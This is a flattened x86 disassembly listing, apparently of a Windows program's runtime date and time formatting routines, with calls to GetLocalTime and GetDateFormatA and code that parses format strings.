add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409724
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4099a4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409858
pop esi
pop ecx
pop ebp
retn 0x8
sub_4099c4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4095d4
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4099ec
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409828
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_409688
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409a50
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_409a94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404268
mov edx eax
mov eax ebx
call sub_409a50
pop ecx
pop ebx
pop ebp
retn
sub_409ab4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4089c0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409a50
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409b00
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409b2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4099a4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409b64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4096c8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409ba4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409cf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fa8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409cf9
lea eax [ ebp - 0x118 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404218
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404268
mov edx eax
mov eax [ ebx ]
call sub_40c0e8
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c25c
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4044c8
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c1f8
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4041a0
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c25c
mov ecx eax
mov eax ebx
mov edx esi
call sub_404098
sub_409d0c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409dea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fa8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409df1
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404218
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404268
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044c8
sub_409e14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a595
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a59c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fcc
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c2dc
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c2bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409a50
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c2dc
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a50
pop ecx
mov al [ eax + lookup_table_409ef7 ]
jmp [ eax * 4 + jump_table_409f30 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b2c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409ba4
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409a94
pop ecx
jmp r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409d0c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409a94
pop ecx
jmp r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409b00
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b64
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b64
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b64
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409b00
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409b00
pop ecx
push ebp
call sub_409b64
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409b64
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
push ebp
call sub_409b00
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
push ebp
call sub_409b64
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409ab4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409ab4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409a50
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a50
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a50
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099c4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409a50
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409a50
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099c4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c2dc
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409a50
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409ab4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099c4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a94
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a94
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c2dc
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e14
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a50
pop ecx
jmp r-xdata
push ebp
call sub_409b2c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099c4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a94
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40881c
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40881c
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40881c
test eax eax
jne r-xdata
jmp r-xdata
sub_40a5c8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409e14
pop ecx
push ebp
mov eax ebx
call sub_409e14
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404098
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a638
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404268
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a65c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a638
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404268
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a6f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a769
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a770
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a638
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404268
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407de0
test eax eax
jne r-xdata
mov eax edi
call sub_404268
add [ esi ] eax
mov bl 0x1
sub_40a77c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a638
mov eax esi
call sub_404268
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a7b4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404268
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a800
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404268
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c320
mov [ ebx ] eax
jmp r-xdata
sub_40a848
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404468
push eax
mov eax [ ebx ]
call sub_404468
pop edx
call sub_40c4d8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a89c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409a3c
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a8f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ac13
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a7b4
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c414
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a65c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a800
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4044c8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407e50
mov eax [ ebp - 0x1c ]
call sub_40a848
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ac1a
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403fcc
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a77c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a65c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a77c
test al al
je r-xdata
call sub_409a3c
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a65c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409760
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4045ac
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a77c
mov edx ebx
mov eax esi
call sub_40a638
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404268
cmp eax [ ebx ]
jl r-xdata
